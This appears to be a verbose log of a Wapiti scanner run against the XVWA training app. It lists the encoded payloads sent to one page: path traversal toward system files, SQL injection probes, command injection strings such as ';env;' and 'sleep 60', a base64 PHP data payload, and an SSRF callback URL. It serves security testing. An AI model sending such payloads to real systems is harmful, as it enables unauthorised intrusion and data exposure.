2024-03-20 15:25:48.281 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 15:25:48.296 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default (1)
2024-03-20 15:25:48.302 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/ (1)
2024-03-20 15:25:48.326 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
2024-03-20 15:25:48.338 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz (0)
2024-03-20 15:25:48.338 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%C2%BF%27%22%28 (0)
2024-03-20 15:25:48.358 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%20AND%2025%3D53%20AND%2099%3D99 (0)
2024-03-20 15:25:48.377 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%20AND%2055%3D112%20AND%2092%3D92 (0)
2024-03-20 15:25:48.392 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%20AND%2010%3D10%20AND%2070%3D70 (0)
2024-03-20 15:25:48.408 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%27%20AND%2023%3D111%20AND%20%2788%27%3D%2788 (0)
2024-03-20 15:25:48.423 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%27%20AND%2092%3D107%20AND%20%2736%27%3D%2736 (0)
2024-03-20 15:25:48.444 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%27%20AND%2042%3D42%20AND%20%2718%27%3D%2718 (0)
2024-03-20 15:25:48.459 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%22%20AND%2091%3D132%20AND%20%2258%22%3D%2258 (0)
2024-03-20 15:25:48.476 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%22%20AND%2092%3D105%20AND%20%2277%22%3D%2277 (0)
2024-03-20 15:25:48.491 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%22%20AND%2064%3D64%20AND%20%2240%22%3D%2240 (0)
2024-03-20 15:25:48.509 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%29%20AND%2017%3D111%20AND%20%2854%3D54 (0)
2024-03-20 15:25:48.525 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%29%20AND%2016%3D91%20AND%20%2863%3D63 (0)
2024-03-20 15:25:48.543 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%29%20AND%2042%3D42%20AND%20%2877%3D77 (0)
2024-03-20 15:25:48.561 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%27%29%20AND%2051%3D76%20AND%20%28%2760%27%3D%2760 (0)
2024-03-20 15:25:48.577 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%27%29%20AND%2087%3D140%20AND%20%28%2717%27%3D%2717 (0)
2024-03-20 15:25:48.596 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%27%29%20AND%2066%3D66%20AND%20%28%2772%27%3D%2772 (0)
2024-03-20 15:25:48.614 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%22%29%20AND%2073%3D140%20AND%20%28%2213%22%3D%2213 (0)
2024-03-20 15:25:48.630 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%22%29%20AND%2039%3D54%20AND%20%28%2240%22%3D%2240 (0)
2024-03-20 15:25:48.645 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%22%29%20AND%2055%3D55%20AND%20%28%2244%22%3D%2244 (0)
2024-03-20 15:25:48.671 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default (1)
2024-03-20 15:25:48.683 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default%20AND%2050%3D140%20AND%2040%3D40 (1)
2024-03-20 15:25:48.701 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default%20AND%2027%3D64%20AND%2028%3D28 (1)
2024-03-20 15:25:48.716 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default%20AND%2034%3D34%20AND%2094%3D94 (1)
2024-03-20 15:25:48.735 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default%27%20AND%2069%3D96%20AND%20%2738%27%3D%2738 (1)
2024-03-20 15:25:48.753 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default%27%20AND%2020%3D86%20AND%20%2755%27%3D%2755 (1)
2024-03-20 15:25:48.770 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default%27%20AND%2065%3D65%20AND%20%2762%27%3D%2762 (1)
2024-03-20 15:25:48.786 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default%22%20AND%2018%3D72%20AND%20%2218%22%3D%2218 (1)
2024-03-20 15:25:48.803 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default%22%20AND%2076%3D150%20AND%20%2220%22%3D%2220 (1)
2024-03-20 15:25:48.826 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default%22%20AND%2030%3D30%20AND%20%2263%22%3D%2263 (1)
2024-03-20 15:25:48.842 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default%29%20AND%2087%3D185%20AND%20%2831%3D31 (1)
2024-03-20 15:25:48.860 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default%29%20AND%2042%3D137%20AND%20%2828%3D28 (1)
2024-03-20 15:25:48.880 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default%29%20AND%2039%3D39%20AND%20%2831%3D31 (1)
2024-03-20 15:25:48.898 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default%27%29%20AND%2019%3D100%20AND%20%28%2780%27%3D%2780 (1)
2024-03-20 15:25:48.933 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default%27%29%20AND%2096%3D182%20AND%20%28%2791%27%3D%2791 (1)
2024-03-20 15:25:48.963 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default%27%29%20AND%2046%3D46%20AND%20%28%2794%27%3D%2794 (1)
2024-03-20 15:25:48.986 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default%22%29%20AND%2072%3D147%20AND%20%28%2230%22%3D%2230 (1)
2024-03-20 15:25:49.001 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default%22%29%20AND%2077%3D141%20AND%20%28%2248%22%3D%2248 (1)
2024-03-20 15:25:49.021 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default%22%29%20AND%2095%3D95%20AND%20%28%2227%22%3D%2227 (1)
2024-03-20 15:25:49.045 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/ (1)
2024-03-20 15:25:49.083 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
2024-03-20 15:25:49.137 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
2024-03-20 15:25:49.148 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz (0)
2024-03-20 15:25:49.155 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
2024-03-20 15:25:49.155 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
2024-03-20 15:25:49.218 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
2024-03-20 15:25:49.219 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
2024-03-20 15:25:49.320 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
2024-03-20 15:25:49.331 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz (0)
2024-03-20 15:25:49.332 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=%3Benv%3B (0)
2024-03-20 15:25:49.339 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=%7Cenv%7C (0)
2024-03-20 15:25:49.347 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=a%3Benv%3B (0)
2024-03-20 15:25:49.354 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=a%3Benv%3B (0)
2024-03-20 15:25:49.362 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
2024-03-20 15:25:49.370 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%3Benv%3B (0)
2024-03-20 15:25:49.377 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz%0Aenv%3B (0)
2024-03-20 15:25:49.384 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=%26set%26 (0)
2024-03-20 15:25:49.391 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=set (0)
2024-03-20 15:25:49.399 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=env (0)
2024-03-20 15:25:49.408 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=%2Fe%00 (0)
2024-03-20 15:25:49.415 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 15:25:49.424 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 15:25:49.432 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 15:25:49.440 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 15:25:49.449 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 15:25:49.459 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 15:25:49.468 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 15:25:49.478 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 15:25:49.488 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 15:25:49.497 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 15:25:49.505 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 15:25:49.512 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 15:25:49.517 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
2024-03-20 15:25:49.525 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=a%60%29%60 (0)
2024-03-20 15:25:49.531 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=a%60sleep%2060%60 (0)
2024-03-20 15:25:49.539 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=a%3Bsleep%2060%3B (0)
2024-03-20 15:25:49.547 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=a%7Csleep%2060%3B (0)
2024-03-20 15:25:49.555 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=%26ping%20-n%2025%20127.0.0.1%26 (0)
2024-03-20 15:25:49.567 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default (1)
2024-03-20 15:25:49.573 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/ (1)
2024-03-20 15:25:49.588 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
2024-03-20 15:25:49.598 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz (0)
2024-03-20 15:25:49.598 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fhi6vkr%2F1%2F6974656d%2F (0)
2024-03-20 15:25:49.612 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default (1)
2024-03-20 15:25:49.618 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/ (1)
2024-03-20 15:25:49.633 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=hi6vkr for results, please wait...
2024-03-20 15:25:51.724 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
2024-03-20 15:25:51.738 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=fuzz (0)
2024-03-20 15:25:51.769 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/?item=default (1)
2024-03-20 15:25:51.797 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/reflected_xss/ (1)
2024-03-20 15:25:51.893 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
2024-03-20 15:25:51.916 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//xss_reflected.json/
2024-03-20 15:25:51.917 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//xss_reflected.json/web_03202024_1525.html with a browser to see this report.
